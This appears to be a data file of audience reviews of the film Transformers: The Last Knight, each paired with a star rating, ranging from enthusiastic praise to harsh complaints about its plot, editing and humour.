people 'dickheads'? Check. A mad, four-foot robot butler who kind-of- but-not-quite breaks the fourth wall by accompanying dramatic scenes with his own incidental music, before firing himself out of a World War II submarine torpedo chute to catch a brace of tuna, cooking and preparing them and setting up the bickering main characters on an underwater date, as they're being chased by the military, on their way to the crash site of a 1600 year-old underwater spaceship, which contains the grave of Merlin. Um, check. And speaking of which; a drunken Merlin (played by Stanley Tucci) riding through the ancient and dramatic British landscape on horseback, wielding a mystical staff that controls an Autobot dragon, who goes on to destroy some Saxons and save King Arthur and the Knights of the Round Table from certain destruction? Check. Historical note: the Saxons actually won that wider war, they went on to become the English. Arthur was actually Welsh, although at the time Welsh and Scottish people were all just 'Britons', of Celtic origin. The Welsh word for English is 'Saeson', which means Saxons. Most English people don't realise this, but the Celtic peoples have never forgotten how they were driven out of their lands all the way back in the Fifth-Century. In Scottish Gaelic the English are called 'Sassanach', which also means Saxon. Both languages are still spoken today. (Don't tell the English.) These are just a few of the myriad delights this mad film has to offer, there are many more besides. The fact that it has only gotten a 15% 'fresh' rating on the site that gave Paul Feig's Ghostbusters 73% just goes to show what politically-motivated snobs movie critics are at heart. This is genuinely the freshest, funniest, most exciting and emotional film I have seen in years. No wonder people don't make excellent movies any more, when original works of wonder and imagination are met with sneering and contempt, by the same people who fawn over politically-motivated rehashes that offer little or nothing in the way of entertainment. Whoever would have thought that in the year Alien: Covenant was released that two of the absolute best, most enjoyable movies released would be the fifth installment of the Transformers franchise and Kong: Skull Island. Two movies which - unlike others I have mentioned in this review - are perfect slices of awesome entertainment, without a hint of pretension. Michael Bay has finally made the movie he's wanted to all his working life. If he had only gone half-way with this film, it would have been a mess. Thank goodness he went all in and served us up such a magnificent, rousing spectacle!",3

What the heck was happening in this movie?,0.5
"Transformers: The Last Knight is a terrible blockbuster that fails to entertain or excite but to be honest it's completely expected at this point. This is the fifth movie in this franchise, where the quality ranges from bad to terrible. This film didn't anger me as I had absolutely no expectation going in but I still think this is an awful feature. You can really just copy and paste all the complaints from the previous movies to this one. It's obnoxiously long, unfunny, full of boring and incoherent action, terrible acting and still crammed full of dreadful racist and sexist 'humour'. The previous movies had at least some good cinematography but here it's just awful. There's an over reliance on hand held camera work, meaning the action scenes are difficult to see and visually sickening. The film also has a constantly changing aspect ratio that is so jarring. It's not like in a Christopher Nolan film where the aspect ratio changes between the action sequences shot in IMAX and the conversation scenes shot on regular film. Here the aspect ratio randomly changes between scenes and it's so distracting. This film is honestly so boring, it should be entertaining as it's full of lots of buzzard elements such as Stanley Tucci playing a drunk Merlin or an action scene taking place in World War 2. The cast all look bored and give bad performances except for the saving grace of the film, Anthony Hopkins. Hopkins is an award winning actor and arguably one of the all time greats, here he gives an over the top and frankly embarrassing performance that is actually hilarious to watch. He so clearly doesn't care it's funny and has the funniest scene in the movie where he tells a man to 'move his fat ass' off of a submarine. The film also admittedly has some good visuals but as far as positives that's really it. This is an utterly awful film, it's badly made and incredibly formulaic and will only appeal to the most hardcore of fans. I also have to mention that I don't understand how Michael Bay doesn't get in more trouble for the racial stereotypes and objectification of women in these movies, it is honestly shocking and completely puts me off the guy and these movies. The marketing for this movie that shows it off as a film where Optimus Prime is the villain is a blatant lie. Prime features in the film for maybe 10 minutes, has a short fight with Bumblebee that finishes with a moment almost as dumb as the Martha line from Batman v Superman. This is a really just an awful movie and it is an absolute crime it made more money than a great blockbuster like War for the Planet of the Apes. I do not recommend this movie to anyone and I think this franchise needs to stop. Truly awful in nearly all regards save for Hopkin's so bad it's good performance. D-",1

"Not surprisingly I expected this, the fifth installment, of the Transformers franchise to be pretty much crap. Especially after the abysmal fourth installment. To my great surprise I found it to be much less crappy than I expected. I honestly do not understand why so many people seems to think this is one of the worst movies ever. The critics sure, especially the ones at Rotten Tomatoes, but I do not really care about those self proclaimed ""critics"". Ordinary viewers is another matter. I mean, this is a transformers movie and it is directed by Michael Bay. That pretty much defines the movie from the start so what the heck did all those people complaining actually expect? That Michael Bay should suddenly care about things like script and stuff or anything else except big robots, special effects and explosions? Personally I quite enjoyed this movie. Well, enjoyed in the context of watching a Transformers movie that is. I enjoyed the special effects, the robots, even the lousy jokes. I did enjoy the tie in to the Pendragon myth and I thought the somewhat bizarre Sir Edmund Burton and his even more bizarre robot butler was great fun. I laughed outright when I saw the World War 1 tank transformer. I was expecting the submarine transformer to actually transform though. Maybe all those detractors of this movie are missing the bimbo with two and a half brain cells (yes I am being generous now) that used to be the lead female character in the Transformers movies but personally I quite liked that the leads in this movie was much more mature and actually showed some evidence of intelligence. The story? Well, for a Transformers movie it is quite good. In any other context it would be somewhat...lacking. It did screw quite a bit with the Transformers timeline established in the first movies though. Oh, and for some nitpicking, the maximum operating altitude of those airplanes they used is 21 000 feet, not 12 000 feet. Bottom line, I had great fun when watching this movie. With my low, and I mean LOW, initial expectations I was very pleasantly surprised. It is definitely a huge improvement over the fourth instalment.",4

"Transformers the last knight had high expectations for me as a fan who has grown up with the franchise. The excitement of seeing the leader of the good team go rogue had potential for a great storyline. But as you have probably guessed it has not lived to expectations. Firstly too many questions unanswered. From how characters survive like megatron to bumblebees new ability there were many other questions which were just left unanswered which spoilt the film. When doing a film series there needs to be some continuity between films and if characters come back tell us how! Second too many storylines. There were so many different storylines in this film it was like every idea was a good idea. This lead to no dominating line and so a weak story. Each storyline was solved in seconds after it being classed as unsolvable. How a transformer can be made evil but then saved simply by a few words of a voice I don't know. It was also hard to keep up with. From merlin to London to a water tomb to Stonehenge I can't say I see the link. Thirdly how has a destroyed world suddenly appeared? Each previous film has said how cybertron has been destroyed yet it is suddenly there in this film. Against this just kills continuity in the franchise. There are many other issues I have with the film but the one thing I really struggle with is the fact each film has a 'item of ultimate power' which can save or destroy the world. I mean come on, either they aren't as powerful or the transformer franchise has something of short term memory loss from the last film. Overall I would say save yourself watching this film if you enjoy the concept of transformers otherwise like me you will struggle to have any faith in it again. I await the follow up with unicorn but I do not expect anything great if it is anything like the last knight...",0.5
"Transformers The Last Knight is one of the fifth movie to be the last movie. But not to be the last movie, but the movie still good with more action and exciting parts. It maybe very longer like 2 hours and 25 mins but the movie is still the best movie. Even though, this isn't last movie of Transformers but it's gonna be the last film for Michael Bay. Very sad. Kids that are big fan of the TV series and the Action Figures should watch this epic action movie.",5

This movie was pitiful. The first Transformer movie was good. Michael Bay give it a rest. Let Disney take over.,0.5
Transformers was an achievement in movie history. As the franchise continues and still under Director Michael Bay's direction. Transformers 2 and 4 to me was failures. Transformers 3 was good and now the fifth one called The Last Knight in my opinion the 2nd best of the series.,4

"Sheesh..... what the heck did I just watch?! I have no idea what's going on in these movies any more half the time. Their big, bright and well animated (except some of the fight scenes) have pretty good music and generally have a somewhat decent plot but this one? I just seemed like a disjointed mess. Again we have an over blown male lead, the American army messing up, useless side characters, Bumblebee and a new female lead to provide eye candy. However she's pretty useless and is nothing more than the cliche girl who thinks she happy in life but is bothered by others because she's not married or has a hidden secret to er and needs a guy to help her get there. Why is it hardly any female lead characters are secure and comfortable with their lives, and arent judged for not having a husband/kids or whatever. Ah well it least it had some good animation and amused my nephew. So some people might like it I guess. The plot is hard to follow at times though and makes no sense when compared to the earlier titles in the series. So it will leave you questioning things if your the type who likes transformers or just notices plot holes.",2

"This movie is a disaster in the guise of a Transformers film. Everything wrong with every other Transformers movie has been rolled into a full length feature. This movie's editing work is made up of constant cuts every few seconds, I felt like I was watching a film designed for someone with severe adult attention deficit disorder. It's ironic, the story is so simple, yet it's wrapped in constant, never ending cuts. The cuts are so constant I felt I needed to stop it and go take a small break to get some relief. At times, the constant cuts were so distracting that I began to think the editing work was somehow the plot, not the content of the frame. Mark Wahlberg and Anthony Hopkins both did their level best to fill their roles with some semblance of grounding. Unfortunately, Bay took that footage and completely ruined all of that acting with one of the worst editing jobs I've seen on a commercial theatrical film. The CGI was average, but felt hugely video gamey rather than even close to realistic. I realize Transformers films have always treated humans as mostly immune to Autobot danger and damage. It's not like a ton of moving metal couldn't easily sever or crush human limbs, but these films have always overlooked that threat. So, no main character ever really gets injured in that way. In a way, it treats the characters as effectively cartoons even though they're portrayed in live action. In fact, I'd rather watch a fully rendered 3D cartoon than watching it as live action. At least I could buy into that cartoon treatment better. The story is pretty much the same as all other Transformers films. Decepticons (or similar) try to take over the Earth and fail. Secondarily, Prime falls prey to 'mind control' and eventually breaks free save the day, but not before putting the Earth in danger. I roll my eyes because this pretty much sums up every Transformers film story. Then, the writers felt the need to tie it into Merlin and the Knights of the round table mythos, but without really successfully showing why that was even necessary. For example, they show the Merlin descendant, supposedly the only one who could wield the staff of power, being parted with the staff and the Decepticons wielding it. So, what was the point in that? Silly, pointless, cliche, trite, inane, unnecessary. This is where this franchise needs to end.",0.5

"Production companies have milked this franchise to the extreme with this latest installment. The Last Knight is no different from every Transformers movie since part 2. The only good thing about it was the humor, something its predecessors lacked for some time. I truly hope no more movies are made because after many cast changes and completely ludicrous plots, there¬ís nothing exciting about Transformers anymore.",2
Good movie was about to buy it. Once again they killed the god so easily. 5 seconds in the battle they're losing and bam. they win. smh. same to wonder woman. but. overall the movie was really good,5
"Super confusing plot. The actors dialogue seemed thrown together and rapidly rehearsed, way to many cliches and just overall wasn't interesting.",2
The first 20 minutes and the last 20 minutes of the film was not that bad. The hour and a half in the middle was garbage to put it mildly. Action and fun wise it was a decent movie. The first two were better but I'd put this third. Worth watching but I can see why the terrible ratings.,2.5
"Transformers The Last Knight:7.5 The best of the series, surpassing the first offering. The nods to the cartoon are plenty to finally make me happy, but unfortunately the Humans still play to large of a pivotal role to reach very good status. Didn't think I would like the movie based on previous experiences, but as a devoted G1 cartoon fan that remembers those cartoons(King Arthur & The Ultimate Doom) & the original animated movie(Hot Rod, Unicron), there were enough similarities to keep me interested. The pace was quick, but didn't feel overly rushed & the amount of (actually) good actors in this film kept it working. Overall I enjoyed it more than any in the previous series & regret not seeing it in the theaters with my son(also G1 raised). Overall:Michael Bay's second best film, after the Rock for me & made me reverse course & actually hope this series continues. Flame away lol I enjoyed the first GI Joe Movie as well.",3.5
How can you ruin a movie that's 75% CGI and only 25% acting....I give you Michael Bay. What a complete nightmare this must have been in editing. Even a great actor like Hopkins was made to look mediocre due to this mess. Whomever paid the bill for this one would have been better with no director. Save your money for the next one and keep his ass off set.,2
amazing spectacular everything just watch it if fans of transformers,5
"Transformers The Last Knight, has to be the worst one they've made yet. I can't believe I made myself sit through the whole thing. Seriously lame movie. Definitely not meant for children, yet had some very child-like cheesy humor and cheesy dialogue. Story line was unbelievably hard to make sense of, and was a bad one to boot. Why, Michael Bay? Just why?",0.5
I couldn't keep up with the constant shifting from one scene to another. It was like I was watching the film in fast forward ! The characters were some of the worst in movie history. An abomination if anything ! Please.. Never again !,0.5

"P√©sima pel√≠cula, una p√©rdida de tiempo.",1
Having been very let down with prior Transformers movies I was ready for one last disappointment and expected to lose interest in the movie early on. However that was not the case. For the first time since Transformers (2007) my interest in the movie was pretty must peaked. I enjoyed the humor and the return of some familiar faces. There was no lack of the Bay effect and I was even okay with the story line.,4.5

"The short: This is a really terribly long CGI video. The long: Back in the day when you would go into a Radio Shack, they would have playing these videos of CGI music videos. Sometimes nauseating, sometimes just boring, you would still watch because it was mesmerizing. Train wrecks will do that to you. That is how this fifth attempt to grope you by your wallet feels. Whether you're a fan of Michael Bay, CGI, Victorias Secret sexualized stereotypes, loss of bladder control, or just having your eardrums shattered for two plus hours, then this is your movie. If you're a Transformers fan, you're out of luck. The robots with names pasted on them, grey amorphous blobs of whirring Rube Goldberg contraptions that sometimes resemble real life vehicles that no one ever will own take third banana to overindulgent lackluster banter between the human characters. It has been over 10 years since the inception of this franchise. At some point, it would have made sense to stop treating this as a green screen movie with human characters, and actually make it about the robots. Unfortunately even the human element has been reduced to numeric stereotypical values. Mark Wahlberg's character Cade Yeager has been reduced to a lumbering masochistic meathead, Laura Haddock has been placed in as the stereotypical eye candy with a brain that partially is Rey from Star Wars and part Lara Croft. Usually this would be considered empowering. In Bay's typical fashion, she is reduced to the T&A for Cade to woo. Isabella Moner for all the boasting that she would be a character that has an influence, is treated as a background sketch. And Anthony Hopkins is cast to method act Shia Lebouf as an older man which in itself is a travesty. The plot makes little sense, once again slamming so many original Transformer storylines together that the deafening sounds of the movie are the sounds of logic dying. Treated as a whole, this abortion of a script could have been a half hour long and had as much wholesale value, but goes into so many different directions you can use this as a test of patience. One slow motion flair camera trick pony Michael Bay does his best to create angles and closeups that make this his best work yet of displaying how not to direct a movie. Somewhere between the plot of Quintessa as lackluster plot hole, transformer hunting armies, good army guys with Point Break syndrome, Megatron and his Suicide Squad, and heel turns galore, you get to sit through this lengthy mess that will leave you saying ""Why did I rent this?"". Do yourself a favor, go find a YouTube video of two trains colliding, set it on repeat for two hours and be more entertained.",0.5

Very enjoyable. Lots of laughs. Loved the one liners. Haven't seen that since the days of the Muppets A worthy flick,4
"It is a superhero movie and if you expect a very different exciting story then you are expecting wrong. All superhero movies have the same basic concept, but the characterization of the concept of transformers and such marvelous acting, direction, action and cinematic visually appealing excellence is something i can enjoy any day. It is one of the most appealing movies and there being so many negative reviews about this movie is unimaginable. I don't know whats wrong with the critics and movie goers. Its only that i guess their expectations from a movie are wrong and hence they are disappointed",4
its ok but not great,3
"After trying to defend the franchise to others despite it's dwindling reviews with each subsequent release, I may need to cut my losses here. While it holds the same visual wonderment as the previous installments, the scripts and plot seem to get worse and worse each time. With a 2.5 hour runtime, I don't think I should feel this lost. Characters seemed to disappear without a thought, many lines were so tacky they almost seemed like outtakes, and the constant bombardment of bigger and bigger explosions and machines finally reached its peak only to set up a 3-minute ending of plot holes and leave a slough of questions. I'm still offering 2 stars of 5 simply because the visual aspect of the film and the scale of the destruction was on par. Despite that, this 150-minute look into Michael Bay's vault of recycled car commercials is not something I'm going to be pushing my friends or family to see.",2
MEH Nice special effects but the story was all over the place. Hard to follow. Too much action too much story. Too much everything except logic and way to fast for the story to mesn anythingWu,1.5
Par for the course. Entertaining enough to be worth watching.,3
"Hands down the worst of the movies yet it speeds and jumps through the story, it has the least amount of Transformer scenes and lastly the majority of the plot points are taken from the IDW comics and core plot is from the Transformers Prime cartoon. While it should be a moment where you smirk and recognize the reference its handled in a way it feels like Bay couldn't come up with original ideas so he used existing ones and twisted them to fit his 'revision'. We did get a new Megatron so that's something... I guess.",1

"Well.... It wasn't terrible. But it wasn't great either. Lets just say that it kept my attention for the majority, partly because it went off on a few far fetched areas of history, and also due to the explosions. I guess you can't ask for a whole lot after a saga has lasted this long. They might want to make 1 more, or do a reboot of some kind if that's possible.",2.5
My favourite of the Transformer series. Liked that they used history to write a story line.,5
Watch it only if you like watching films written by 11yo's that had their class stories rejected by their teacher and now they are determined to prove their teachers and world wrong in any way they can with complete disregard for all forms of story sense. #michaelbaykilledtransformers #Transformersusedtobecool,1.5
"Don't listen to most of these puffed up windbags that call themselves critics. It's almost laughable that we're supposed to take any of their opinions seriously when they compare the likes of the Transformers franchise to films like Dunkirk. I believe Michael Bay delivers yet again with his final installment of the franchise. Does Bay promise cerebral, emotional, epiphany enducing cinema, that will leave you thinking about your role in the universe weeks after you've seen the film, Nope. Bay delivered what he always delivers in a Transformers movie. High octane, adrenaline inducing battles between robots who can perform death defying action. Amidst all the carnage and destruction, you will find yourself rooting for the Autobots to destroy the Decepticons and save our planet.",5
"If I can give a show ZERO, I will and this is my FIRST! But at last... the worst I can do is 0.5. I will do just that before going to sleep. I'm surprised it is a 15% in RT.

This is the kind of wonderland one will go through when somehow your fairy god mother decided to grant someone the freedom in DIRECTING A ""SUPPOSED"" BLOCKBUSTER with millions of budget, a history with loyal followers and fan base, hiring of A list and good looking actors and actresses, potential GOOD story line, CGI supremo and guaranteed profit from Summer Release! BUT.... BUT.... Somehow.... all those got thrown out the window when someone woken up from a really really bad trip and decided that it would be a great IDEA to squeeze the following movies: - Armegeddon - independence Day - A lil' of Passengers with JL and CP (scene of romance in submarine) - Interstellar (time and dimension) - A lil' bit of Species (that Quintessa) - Star Wars (that damn weakness in Cybertron) - and many more plagiarism that I just can't stop naming..... and MAKE IT A SO CALLED ""last movie I'm going to direct""!!!! THANK GOD! Please... it is almost like the best DECISION Steve Balmer can make retiring from Microsoft and Satya Nadella taking over! PLEASE PLEASE......

"Yes this is a long typical Michael Bay Movie, this time around the new hotness is Bay's definition of a professor,yeah more exotic car's and tons of special effects in fact way too much? ,Well the movie isn't well received by most critics but I think it wasn't that bad better then Suicide Squad with all that hype,although both sorta have same antagonist,well the movie have its moment's some will even give you goose bumps I think this movie will have more of cult based fans over the years rather than the usual hence the bad ratings???",4
"Michael Bay's lack of vision allied with an uncreative plotline makes this movie a garbage can of highly-sponsors dish offs wreckage and redundant old news american army propaganda. Don't waste your money in it, not even worth a review. 0.3/5",0.5
"Well the pattern continues for these Transformers films, they are garbage. Once again there is a shoddy plot with characters I care nothing about with humans given more screen time rather then you know, the Transformers. Forced romance between Mark Wahlberg and new woman who was supposed to be an Oxford professor instead of a Victoria Secret model. Of course all the other characters are pointless and flatter than Kansas. With all this comes the standard Michael Bay cringe humor and dialogue though fortunately it wasn't as terrible as the previous films. Product placement is scaled back thankfully as well and the CGI was tolerable. Transformers: The Last Knight was a mess like the whole series is but i can say that for me anyway it wasn't a soul crushing experience like Age of Extinction was. Shorter too fortunately. Hardly an endorsement to see this but you won't want to commit suicide halfway though. Probably.",2
"In order to enjoy this movie you really need to watch the previous 4 films back to back. This movie really makes you realize how much everything has evolved as a series and the story is quite good. I wish Optimus was in the film more, but having B.B. finally use his own voice at the end was satisfying. I hated how the mentioned Sam was died and the movie could have used more scenes with transformers. 4/5",4
I usually give movies a lot of latitude and am able to find at least one redeeming quality. It is rare that I simply give up on a movie. It is even more rare that I decide that I need to write a review on how terrible a movie is. But this one earned it. This was a terrible movie. It actually gave me an attitude. I was exhausted and confused. I gave up with no intention of ever returning to it. I will never be able to get that time back. One more time for the folks in the back: this was a terrible movie.,1
Way Better than the last one. Its ok not great.,3
This was one of the best directed movies of the year. It has great special effects and fantastic actors. Can't wait to see more from these film makers,0.5

Perfect movie same last movie.,5
"Movie felt like a combination of everything popular: Game of Thrones, Stranger Things, Star Wars, etc. Less about the Transformers in this movie, Optimus and Megatron probably only had 2 scenes. Excited for Hot Rod, but they didn't even introduce him with a bang, I had to Google to see which car Hot Rod was. Ridiculous how a a little girl is fighting the Transformers, as well as Mark Walberg fighting them hand-to-hand. Corny jokes and little hard to follow the story. Definitely disappointed.",1.5

"Transformers: The Last Knight is a new movie in the ups and downs franchise! This franchise started very well, and then went very bad, then ""oh, there is a chance"", to the best of the franchise, and when I finally thought that there's finally a way to save this franchise, they made Transformers: The Last Knight! When the opening credits started, I was like ""oh, the Paramount logo is accompanied by a series of robotic sounds. and fireballs are flying everywhere, this definitely gonna be a great movie!"". Turns out, I was wrong! Actually it's a good movie, but not like Transformers: Age of Extinction -BTW, it's my favorite movie in the franchise-. About the opening credits.. after the Paramount logo, I was thrilled, because of the epic battle, and disgusted because of the bad start of this movie, and the bad-acting! By saying ""The bad start"" I mean why did they know Merlin and how did he have contract with the Transformers and how all of that's happening?! The whole movie was sometimes fine and sometimes very bad! The jokes were seriously unnecessarily. Until we reach to the fight of Optimus Prime and Bumblebee, the one that I was really waiting for, lasts only for 02:45 min. I was like ""Com'on it's 02:34:38 movie, and all what I get is 02:45 min?"" BTW, the length of this movie is so long, and that made me bored! Back to the fight, how did Bumblebee speak? And how did that change Optimus Prime? This movie is just an open-questions movie! The young actress Isabela Moner as Izabella was actually overreacting at everything she did! The soundtrack and the CGI were really good. Beside the action sequence, it was very good! So, Transformers: The Last Knight is a ""just fine"" movie!",3
at least we got to see a good amount of time of Megatron on screen,5

The only problem, an adult oriented scum bag who's only interest is to deceive children's minds and to make parents squirm in their seats with every foul mouthed character that belts explicit words out of its mouth, hoping that their kids don't pick up these catch phrases!! What a disgrace.",0.5
transformers the last Knight is amazing they Better carry it on,5
"My brain is so numb to these movies now. So did you know that the only reason that the Knights of the Round Table were so successful was because they had transformers on their side? Well, that's just the way that it was back in the day, but the point is that our heroes of today are going to need some relics of the past if they want to stop Earth from combining with Cybertron... or something. I don't know. At this point if you're expecting me to be able to seriously explain plot points of this story, you've come to the wrong blog. I just went back and reread my review of Age of Extinction, and I was actually surprised about how much I forgot about a movie that I saw only three years ago. All of the storylines from the different movies start to blur together as the time passes, so can The Last Knight turn a corner and make itself memorable? No. No it cannot. If there is one thing that you do walk away remembering about this, it is just how stupid it gets. I can deal with Wonder Woman helping out in World War I, but you know what I can't get past? A transforming car helping to kill Nazis, never mind a mechanical dragon assisting Merlin and King Arthur's court in battle. The story is just lazy and inane, and it always feels like the lackadaisical writing is an insult to your intelligence. It eclipses any positives about this movie, and believe it or not, I do have a couple of nice things to say about this. I like the girl that they promoted heavily in the trailers, Isabela Moner. I think she's a talented little actress, but they completely mislead you into thinking that she is going to play a bigger role here. There's a giant chunk of this in the middle where she is just M.I.A., and the same could be said about a big reason that most fans are coming in to watch this: Optimus Prime. The other positive I have to say about this is that I do feel that the action is shot significantly better, and that's me speaking about the series as a whole. For the first time ever, I could actually tell what was happening instead of a furious blur of car crash metal. That said, I still didn't care about any of the characters or what was going to happen to anybody, so it ends up being a moot point. This is the first movie not to expand in run time length, which I am all but positive was a studio decision, (I believe the original plan was for this to be three hours long). Please believe that I appreciate that, but it is still bloated as can be at two and a half hours. The story never makes any fluent sense at any point, and this movie makes traveling by map look like something that Indiana Jones would only do in case of an emergency. They are all over the world in a moment's notice, from Cuba to England, and from the Badlands of South Dakota to Stonehenge, they are navigating the globe like an A.D.D. afflicted Superman. The one thing I take solace in is that people are finally starting to wise up about these movies, because this didn't make anywhere near what the studios expected it to, both domestically and internationally. Sequelitis is in full effect, and I am happy to see audiences finally speaking with their wallets. None of the jokes hit, and I don't like any of the characters, human or otherwise. Anthony Hopkins is pretty bad in this, and it really seems like he just accidentally wandered off the Westworld set and thought he was in the right place just because there were robots. I hated the comic relief British sidekick robot, and he is just a small notch above Skids and Mudflap from the second movie. When it started rewriting history, that's when I abandoned all hope, and the small positives are drowned in an ocean of problems.",1
I hope they carry this on its been absolutely amazing since the first,5

"Despite some amazing visuals and fun action, this movie is another example of why Micheal Bay should leave the franchise",2.5
"Meh. It's not godawful, it's not particularly good, it's just kinda... there. It runs way too long as usual, and if it were trimmed down significantly there might be some fun throwaway popcorn entertainment. But as is, it's mostly just a waste and the stepping stone to the next installment.",3

"Transformers: The Last Knight is a grotesque affront to both aspiring screenwriters who toil in anonymity outside of the Hollywood system pouring their hearts, souls and creative totality into better screenplays than this one only to be repeatedly assured that they've not yet reached screenwriting competency and to the screen writers inside of the Hollywood system who toil feverishly under the ever present and ever more oppressive spectre of the threat of being replaced by the aforementioned, not yet discovered screenwriters who are constantly howling at the gates, hungrily, licking their chops and desperately awaiting the opportunity to supplant a card-carrying member of the establishment. The Last Knight is a shockingly TERRIBLE story which was excruciatingly told! While I fully understand that making a movie of this budget and scale is a long way from easily accomplished, storytelling this dreadful is really no one's fault but the director's. It is truly saddening that THIS movie is what Frank Welker's classic Megatron vocal gets to return to. This franchise and the property at large need, deserve and are practically BEGGING for a reboot... BUT... VISUALLY, TRANSFORMERS: The Last Knight is EGREGIOUSLY epic and beautiful! As fine a testament to modern cinematic visuals as can be made!... Just ABSOLUTE visual AMBROSIA!!! Whether or not Michael Bay genuinely knows how to or even cares to tell a good story might be a debatable matter but, what is NOT debatable in any way, shape or form is that the man knows how to make STUNNINGLY GORGEOUS moving pictures... ...and that's why, as a hard-core, disgruntled and disgusted Transformers fan who has been there since they first hit U.S. television in the fall of 1984, I continue to watch these movies and, though I WAS able to resist wasting a day at the theater, I simply couldn't refrain from purchasing this one in 4K/UHD when it arrived on home video.

"The story is... Well, it isn't horrible. But it definitely isn't theatre-worthy, and it isn't even consistent with established points of the Transformers Cinematic Universe. Michael Bay doesn't seem to remember that Bumblebee actually got his voice back at the end of the first movie... and then lost it again. The movie had its funny moments, but most of the jokes ultimately fell flat. And then... there's the choppy editing. In the movie, you can clearly see scenes with either two different shots split and put together, or parts of the scene just cut out right in the middle. Michael Bay's been on a decline, but this... This is just sad. He's been directing for years, but this is the work of a total amateur. would not recommend for anyone, or any age. Your money and time are better spent elsewhere.",1.5
"so borring, to many elements and no fun at all.",0.5

"Was allot better then Rotten tomatoes makes it out to be. Sticks close to the original story line of the comics, not o my that the plot was clearly to lead up to something greater.

"Garbage! I've never felt so compelled to write a review about a movie! For the first time a movie was so irritating that I just have to talk about it! I just managed (barely) to watch the whole movie, at the final sequence I felt Like every second was an eternity, I literally could not, for the life of me, stay focused on the movie! It's cheap, it's boring, literally nothing makes any kind of sense!!! (i.e. how did bumble bee get his voice back? why is earth the natural enemy of cybertron?Who were the thousands enemy ships in the final battle and where did they come from? and many many more). There is no other word that describes the plot better than ""stupid"", an insult to the viewers in my opinion, they tried to tie the transformers with the story of king Arthur and Merlin and they didn't even bother to include the iconic Excalibur! (Like that would be the thing out place....) Instead of it we have this all powerful staff that can destroy the world, that does absolutely nothing in the whole movie other than change it's size depending on who's holding it, which according to the plot should only be Vivian since it has her DNA on it and can be controlled ""only by her"". Fun Fact, SHE NEVER DOES ANYTHING WITH IT! She is only shown grabbing and moving it like a regular staff something that 2 other characters (and possibly everyone) were able to do! I could go on for much more about this movie and how terrible it is, but I think I've made my point. I'll finish saying this, this movie is WORSE than fant4stic, at least in that one you can follow what was going on and why (kinda). 15% Should be considered mercy!",0.5

"The first scenes were incredible, I think Bay has that visual eye that Ridley Scott has but that is where the comparisons end. For all the good action work, Bay incorporates poor humour, easy jokes that don't float. Dark of the Moon would've been a great exit point for Bay, the franchise was in an okay state but the last 2 films have almost killed the franchise. This film is a clear sign the talents Paramount hired to create a film universe were not worth the money that was handed to them, what did they do in that writers room? What a mess. The action scenes are almost redundant when you don't have a clear storyline, who is the villain? It just feels like a saga with zero ending, I feel sorry for people that don't have any idea of the backstory mythology because like me, you will be lost. It just feels very much run of the mill here again and audiences stayed right away from this film, hopefully the studios realise an empty film with a bloated budget doesn't bring a crowd. 19-09-2017. Too much here. The film had many development people involved at pre-production, so this is a massive incoherent misfire. The Last Knight is a gigantic mess of mythology building a sequel retention. Character's tend to be left on the floor with little, or next to nothing to do. Transformers has never been a critical smash, that only the fans enjoyed for Michael Bay's action scenes. This appears to have killed the franchise in its current form. Not a good film at all, action scenes are incredible at the end though. This is right on par with Revenge of the Fallen. Just disappointing. Review remains the same. 03/01/2020",1.5
"The Transformers franchise has never been good. Some say that the series is ""Dumb fun with good action and cool explosions. To me, that could maybe be used to describe only the third movie. The first one is promising and has a certain ""child-like-wonder"" appeal. But neither of them are truly ""good"". The second Transformers is meaningless garbage. But when Age of Extinction was released in 2014, the franchise hit new, abysmal lows. Watching Transformers wasn't just a chore, it wasn't just boring, it was excruciating. It was so bad I felt nauseous. I was aggravated to the point of brimming with feelings of genuine anger. They say that if a film makes you feel something, that is a victory in itself. Be it sadness, excitement, intrigue, joy, hope, nostalgia, hysteria, love, fear, warmth - whatever - I tend to agree with that statement. What I felt in Age of Extinction was not a victory. It was a failure. A Guinness Book of World Records level failure. Transformers: The Last Knight, is at least that bad again. Arguably worse. I guess it didn't dedicate an entire character to being a justification for paedophilia, so it has that up on its predecessor.",0.5

"It makes me sad to see actors like Anthony Hopkins, John Goodman and Stanley Tucci in Transformers: The Last Knight. This movie is terrible. The filmmaker's approach seems to be that plot points and character's actions don't have to make sense, as long as they move the story forward. But, I'm sorry, no amount of car chases, explosions or visual effects can save this half-baked mess.",1.5

"Pretty much all the criticisms that I had for the last film applies to this film. It's overlong, convoluted, and worst of all, BORING! It's still better than Age of Extinction and Revenge of the Fallen, but that's hardly a compliment. It doesn't try as hard as either of the movies to be funny, but like every other Michael Bay movie, there were bad attempts at humour and shitty one-liners. There were some nice use of slow-mo shots and this makes it easier to follow the action. There were only two good scenes in the entire film. The car chase scene in London and the fight scene between Bumblebee and Optimus Prime. Speaking of Optimus Prime, he's barely in the film. In this 2 and a half hour movie (which is pretty typical for a Transformers movie), I would say that Optimus Prime had a total of 15 minutes of screentime. He's essentially The Joker from Suicide Squad. A lot of fans have defended the limited screentime that The Joker had in Suicide Squad because he's a supporting character, but Optimus Prime has always been an important character in the franchise. Why did we need John Turturro, the black guy, and the bad child actor more than Optimus Prime? I've never been a Transformers fan, but Optimus Prime has always been the best part about the franchise. And like every other Transformers movie, there's a very long and boring third act action set-piece followed by a monologue from Optimus Prime to end the film. Even when you're starting to enjoy the action, it's ruined by not only bad jokes, but constant changes of aspect ratio. Usually, a big budget movie would film entire scenes (usually important scenes) in IMAX before reverting to its original aspect ratio to make the transition as unobtrusive as possible. But the way Bay uses IMAX, the aspect ratio changes in the same scene with each cut, some of which aren't even a second long. Even shot reverse shot changes aspect ratio. It's distracting and pretty hard to ignore. The same visual mess can be seen in Revenge of the Fallen. It's as if Michael Bay is completely talentless. I know people enjoy the Transformers movies for the junk food that it is and would ridicule me for expecting decent writing. I've given that up since Revenge of the Fallen. For the past four films, I've tried to enjoy Transformers as a mindless action flick, but Michael Bay has been doing the same thing for all of these films. It's really not too much to ask for more substance when Logan, Wonder Woman, and Guardians of the Galaxy 2 offers much more than mindless visuals and loud explosions. Even Fast & Furious 8 does mindless action better than Transformers. It's a 2/10 for the two good scenes in the entire film.",1

"I get the fact that these Transformers movies make a lot of money so the Hollywood Studios keep cranking them out. But God are they awful!

"If you want a 2 and half hour long very fast slide show of beautiful wallpapers, then enjoy. If you want a good movie, then avoid this mess of a movie. The movie doesn't have simple or complicated story, just gibberish. All those wonderful effects and shots wasted on a shallow and nonsensical movie, this is coming from a guy who loved Armageddon and The Rock. It was a big effort for me to at least finish the movie. Just a trash and a waste of time.",0.5
